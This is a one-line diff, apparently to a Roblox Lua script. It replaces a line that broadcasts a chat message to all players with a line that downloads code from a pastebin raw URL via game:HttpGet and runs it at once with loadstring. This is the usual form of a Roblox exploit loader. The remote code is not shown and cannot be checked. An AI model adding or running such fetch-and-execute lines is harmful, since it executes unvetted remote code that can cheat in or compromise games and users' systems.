@@ -1,1 +1,1 @@
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("meta called is dahhddy" ,"All")
+loadstring(game:HttpGet"https://pastebin.com/raw/v1wNMQmd")()
